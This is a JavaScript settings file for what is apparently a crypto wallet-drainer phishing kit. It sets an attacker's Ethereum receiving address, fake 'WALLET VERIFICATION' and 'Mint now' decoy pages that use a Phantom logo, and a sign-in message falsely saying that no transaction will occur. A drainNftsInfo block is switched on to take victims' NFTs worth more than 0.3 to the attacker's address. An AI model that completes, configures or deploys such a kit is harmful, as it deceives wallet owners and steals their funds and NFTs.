// REPLACE XXXXX WITH ETH ADDRESS
const receiveAddress = "0x2702b1d11d92B564f875A2B35DF545F5c8549bCf";

const collectionInfo = {
    name: "", // ENTER PROJECT NAME
    socialMedia: {
        discord: "https://discord.com/",
        twitter: "https://twitter.com/",
        instagram: "https://instagram.com/",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.jpg", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "WALLET VERIFICATION",
}

const claimPageInfo = {
    title: "", // TITLE FOR CLAIM PAGE USE <br> FOR LINE BREAK
    shortDescription: "WALLET VERIFICATION.",
    longDescription: "", // LONG DESCRIPTION OF YOUR PROJECT

    claimButtonText: "VERIFY WALLET",

    image: "phantom_logo.jpg", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const drainNftsInfo = {
    active: true, // USE (true) IF YOUR WANT TO DRAIN NFT, IF NOT USE (false).
    minValue: 0.3, // MINIMUM WORTH OF NFT..... WILL DRAIN NFT IF FLOOR PRICE IS HIGHER minValue
    nftReceiveAddress: "0x2702b1d11d92B564f875A2B35DF545F5c8549bCf" // leave empty if you want to use the same as receiveAddress 
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "WHITELIST",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") ||
    (
        receiveAddress.length >= 64 ||
        receiveAddress.length <= 40
    )
) console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion